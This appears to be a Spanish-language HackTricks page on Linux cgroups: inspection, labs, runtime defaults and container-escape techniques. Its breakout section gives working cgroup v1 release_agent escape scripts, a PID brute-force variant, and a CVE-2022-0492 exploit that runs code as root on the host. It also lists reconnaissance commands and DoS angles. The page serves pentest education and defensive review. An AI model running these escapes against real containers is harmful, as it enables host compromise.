# cgroups

{{#include ../../../../banners/hacktricks-training.md}}

## Descripción general

Linux **grupos de control** son el mecanismo del kernel usado para agrupar procesos juntos para contabilidad, limitación, priorización y aplicación de políticas. Si namespaces se tratan principalmente de aislar la vista de los recursos, cgroups se ocupan principalmente de gobernar **cuánto** de esos recursos puede consumir un conjunto de procesos y, en algunos casos, **qué clases de recursos** pueden interactuar en absoluto. Containers dependen de cgroups constantemente, incluso cuando el usuario nunca los mira directamente, porque casi todos los runtimes modernos necesitan una forma de decirle al kernel "estos procesos pertenecen a esta carga de trabajo, y estas son las reglas de recursos que se les aplican".

Por eso los motores de containers colocan un nuevo container en su propio subárbol de cgroup. Una vez que el árbol de procesos está allí, el runtime puede limitar la memoria, restringir el número de PIDs, ponderar el uso de CPU, regular el I/O y restringir el acceso a dispositivos. En un entorno de producción, esto es esencial tanto para la seguridad multi-tenant como para la higiene operativa simple. Un container sin controles de recursos significativos puede ser capaz de agotar la memoria, inundar el sistema con procesos o monopolizar CPU y I/O de formas que hagan inestables al host o a las cargas de trabajo vecinas.

Desde una perspectiva de seguridad, cgroups importan de dos maneras separadas. Primero, límites de recursos incorrectos o ausentes permiten ataques de denial-of-service sencillos. Segundo, algunas características de cgroup, especialmente en configuraciones antiguas de **cgroup v1**, históricamente han creado primitivas de breakout potentes cuando eran escribibles desde dentro de un container.

## v1 vs v2

Existen dos modelos principales de cgroup en uso. **cgroup v1** expone múltiples jerarquías de controladores, y los writeups de exploits más antiguos a menudo giran en torno a las semánticas extrañas y a veces excesivamente poderosas disponibles allí. **cgroup v2** introduce una jerarquía más unificada y un comportamiento generalmente más limpio. Las distribuciones modernas prefieren cada vez más cgroup v2, pero aún existen entornos mixtos o legacy, lo que significa que ambos modelos siguen siendo relevantes al revisar sistemas reales.

La diferencia importa porque algunas de las historias de breakout de containers más famosas, como los abusos de **`release_agent`** en cgroup v1, están vinculadas muy específicamente al comportamiento antiguo de cgroup. Un lector que vea un exploit de cgroup en un blog y luego lo aplique ciegamente a un sistema moderno solo con cgroup v2 probablemente malinterprete lo que realmente es posible en el objetivo.

## Inspección

La forma más rápida de ver en qué cgroup está tu shell actual es:
```bash
cat /proc/self/cgroup
findmnt -T /sys/fs/cgroup
```
El archivo `/proc/self/cgroup` muestra las rutas de cgroup asociadas al proceso actual. En un host moderno con cgroup v2, a menudo verás una entrada unificada. En hosts más antiguos o híbridos, puedes ver múltiples rutas de controladores v1. Una vez que conozcas la ruta, puedes inspeccionar los archivos correspondientes bajo `/sys/fs/cgroup` para ver los límites y el uso actual.

En un host con cgroup v2, los siguientes comandos son útiles:
```bash
ls -l /sys/fs/cgroup
cat /sys/fs/cgroup/cgroup.controllers
cat /sys/fs/cgroup/cgroup.subtree_control
```
Estos archivos revelan qué controladores existen y cuáles están delegados a los cgroups hijos. Este modelo de delegación importa en entornos rootless y systemd-managed, donde el runtime puede solo controlar el subconjunto de la funcionalidad de los cgroups que la jerarquía padre realmente delega.

## Laboratorio

Una forma de observar los cgroups en la práctica es ejecutar un contenedor con límite de memoria:
```bash
docker run --rm -it --memory=256m debian:stable-slim bash
cat /proc/self/cgroup
cat /sys/fs/cgroup/memory.max 2>/dev/null || cat /sys/fs/cgroup/memory.limit_in_bytes 2>/dev/null
```
También puedes probar un contenedor con límite de PID:
```bash
docker run --rm -it --pids-limit=64 debian:stable-slim bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
```
Estos ejemplos son útiles porque ayudan a conectar el runtime flag con la interfaz de archivos del kernel. El runtime no está haciendo cumplir la regla por arte de magia; está escribiendo las configuraciones relevantes de cgroup y luego dejando que el kernel las aplique contra el árbol de procesos.

## Runtime Usage

Docker, Podman, containerd, y CRI-O dependen de cgroups como parte de su operación normal. Las diferencias usualmente no son sobre si usan cgroups, sino sobre **qué valores por defecto eligen**, **cómo interactúan con systemd**, **cómo funciona la delegación rootless**, y **qué parte de la configuración se controla a nivel del engine versus a nivel de orquestación**.

En Kubernetes, los resource requests y limits eventualmente se convierten en configuración de cgroup en el node. El camino desde el Pod YAML hasta la aplicación por el kernel pasa por el kubelet, el CRI runtime, y el OCI runtime, pero cgroups siguen siendo el mecanismo del kernel que finalmente aplica la regla. En entornos Incus/LXC, cgroups también se usan intensamente, especialmente porque los system containers a menudo exponen un árbol de procesos más rico y expectativas operativas más similares a VM.

## Misconfigurations And Breakouts

La historia clásica de seguridad de cgroup es el mecanismo escribible **cgroup v1 `release_agent`**. En ese modelo, si un atacante podía escribir en los archivos adecuados del cgroup, habilitar `notify_on_release`, y controlar la ruta almacenada en `release_agent`, el kernel podría terminar ejecutando una ruta elegida por el atacante en los namespaces iniciales del host cuando el cgroup quedaba vacío. Por eso los escritos antiguos prestan tanta atención a la escribibilidad del controlador de cgroup, las opciones de montaje y las condiciones de namespace/capability.

Incluso cuando `release_agent` no está disponible, los errores de cgroup siguen importando. Un acceso demasiado amplio a dispositivos puede hacer que dispositivos del host sean alcanzables desde el contenedor. La ausencia de límites de memoria y PID puede convertir una simple ejecución de código en un DoS contra el host. Una delegación débil de cgroup en escenarios rootless también puede engañar a los defensores haciéndoles asumir que existe una restricción cuando el runtime nunca fue realmente capaz de aplicarla.

### `release_agent` Background

La técnica de `release_agent` solo aplica a **cgroup v1**. La idea básica es que cuando el último proceso en un cgroup finaliza y `notify_on_release=1` está establecido, el kernel ejecuta el programa cuya ruta está almacenada en `release_agent`. Esa ejecución ocurre en los **namespaces iniciales en el host**, lo que convierte a un `release_agent` escribible en un primitive de escape de contenedor.

Para que la técnica funcione, el atacante generalmente necesita:

- una jerarquía escribible **cgroup v1**
- la capacidad de crear o usar un cgroup hijo
- la capacidad de establecer `notify_on_release`
- la capacidad de escribir una ruta en `release_agent`
- una ruta que se resuelva como un ejecutable desde el punto de vista del host

### Classic PoC

El PoC histórico de una sola línea es:
```bash
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p "$d/w"
echo 1 > "$d/w/notify_on_release"
t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
touch /o
echo "$t/c" > "$d/release_agent"
cat <<'EOF' > /c
#!/bin/sh
ps aux > "$t/o"
EOF
chmod +x /c
sh -c "echo 0 > $d/w/cgroup.procs"
sleep 1
cat /o
```
Este PoC escribe una ruta del payload en `release_agent`, activa la liberación del cgroup y luego vuelve a leer el archivo de salida generado en el host.

### Explicación legible

La misma idea es más fácil de entender cuando se divide en pasos.

1. Crear y preparar un cgroup escribible:
```bash
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp    # or memory if available in v1
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
```
2. Identifica la ruta del host que corresponde al sistema de archivos del contenedor:
```bash
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
3. Colocar un payload que será visible desde la ruta del host:
```bash
cat <<'EOF' > /cmd
#!/bin/sh
ps aux > /output
EOF
chmod +x /cmd
```
4. Disparar la ejecución dejando el cgroup vacío:
```bash
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"
sleep 1
cat /output
```
El efecto es la ejecución en el host del payload con privilegios root del host. En un exploit real, el payload normalmente escribe un archivo de prueba, lanza un reverse shell o modifica el estado del host.

### Variante de ruta relativa usando `/proc/<pid>/root`

En algunos entornos, la ruta del host al container filesystem no es obvia o está oculta por el storage driver. En ese caso la ruta del payload puede expresarse mediante `/proc/<pid>/root/...`, donde `<pid>` es un PID del host que pertenece a un proceso en el contenedor actual. Esa es la base de la variante de fuerza bruta por ruta relativa:
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

sleep 10000 &

cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh
OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}
ps -eaf > \${OUTPATH} 2>&1
__EOF__

chmod a+x ${PAYLOAD_PATH}

mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID}"
exit 1
fi
fi
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

sleep 1
cat ${OUTPUT_PATH}
```
El truco relevante aquí no es la fuerza bruta en sí, sino la forma de la ruta: `/proc/<pid>/root/...` permite al kernel resolver un archivo dentro del sistema de ficheros del contenedor desde el espacio de nombres del host, incluso cuando la ruta directa del almacenamiento del host no se conoce de antemano.

### CVE-2022-0492 Variante

En 2022, CVE-2022-0492 demostró que escribir en `release_agent` en cgroup v1 no comprobaba correctamente `CAP_SYS_ADMIN` en el espacio de nombres de usuario **inicial**. Esto hizo que la técnica fuera mucho más accesible en kernels vulnerables porque un proceso del contenedor que pudiera montar una jerarquía cgroup podía escribir en `release_agent` sin ya tener privilegios en el espacio de nombres de usuario del host.

Exploit mínimo:
```bash
apk add --no-cache util-linux
unshare -UrCm sh -c '
mkdir /tmp/c
mount -t cgroup -o memory none /tmp/c
echo 1 > /tmp/c/notify_on_release
echo /proc/self/exe > /tmp/c/release_agent
(sleep 1; echo 0 > /tmp/c/cgroup.procs) &
while true; do sleep 1; done
'
```
En un kernel vulnerable, el host ejecuta `/proc/self/exe` con privilegios root del host.

Para un abuso práctico, empieza comprobando si el entorno aún expone rutas cgroup-v1 escribibles o acceso a dispositivos peligrosos:
```bash
mount | grep cgroup
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null -exec ls -l {} \;
find /sys/fs/cgroup -maxdepth 3 -writable 2>/dev/null | head -n 50
ls -l /dev | head -n 50
```
Si `release_agent` está presente y escribible, ya estás en legacy-breakout territory:
```bash
find /sys/fs/cgroup -maxdepth 3 -name notify_on_release 2>/dev/null
find /sys/fs/cgroup -maxdepth 3 -name cgroup.procs 2>/dev/null | head
```
Si la propia ruta de cgroup no permite un escape, el siguiente uso práctico suele ser denial of service o reconnaissance:
```bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
cat /sys/fs/cgroup/memory.max 2>/dev/null
cat /sys/fs/cgroup/cpu.max 2>/dev/null
```
Estos comandos te indican rápidamente si la carga de trabajo tiene margen para fork-bomb, consumir memoria de forma agresiva o abusar de una interfaz cgroup heredada y escribible.

## Comprobaciones

Al revisar un objetivo, el propósito de las comprobaciones de cgroup es averiguar qué modelo de cgroup está en uso, si el contenedor ve rutas de controlador escribibles y si primitivas antiguas de breakout como `release_agent` siquiera son relevantes.
```bash
cat /proc/self/cgroup                                      # Current process cgroup placement
mount | grep cgroup                                        # cgroup v1/v2 mounts and mount options
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null   # Legacy v1 breakout primitive
cat /proc/1/cgroup                                         # Compare with PID 1 / host-side process layout
```
What is interesting here:

- If `mount | grep cgroup` shows **cgroup v1**, los writeups antiguos sobre breakout se vuelven más relevantes.
- If `release_agent` exists and is reachable, eso merece una investigación más profunda de inmediato.
- If the visible cgroup hierarchy is writable and the container also has strong capabilities, el entorno merece una revisión mucho más detallada.

If you discover **cgroup v1**, writable controller mounts, and a container that also has strong capabilities or weak seccomp/AppArmor protection, esa combinación merece atención cuidadosa. cgroups a menudo se tratan como un tema aburrido de gestión de recursos, pero históricamente han formado parte de algunas de las cadenas de escape de container más instructivas precisamente porque el límite entre "resource control" y "host influence" no siempre fue tan limpio como la gente suponía.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Enabled by default | Containers are placed in cgroups automatically; resource limits are optional unless set with flags | omitting `--memory`, `--pids-limit`, `--cpus`, `--blkio-weight`; `--device`; `--privileged` |
| Podman | Enabled by default | `--cgroups=enabled` is the default; cgroup namespace defaults vary by cgroup version (`private` on cgroup v2, `host` on some cgroup v1 setups) | `--cgroups=disabled`, `--cgroupns=host`, relaxed device access, `--privileged` |
| Kubernetes | Enabled through the runtime by default | Pods and containers are placed in cgroups by the node runtime; fine-grained resource control depends on `resources.requests` / `resources.limits` | omitting resource requests/limits, privileged device access, host-level runtime misconfiguration |
| containerd / CRI-O | Enabled by default | cgroups are part of normal lifecycle management | direct runtime configs that relax device controls or expose legacy writable cgroup v1 interfaces |

The important distinction is that **cgroup existence** is usually default, while **useful resource constraints** are often optional unless explicitly configured.
{{#include ../../../../banners/hacktricks-training.md}}
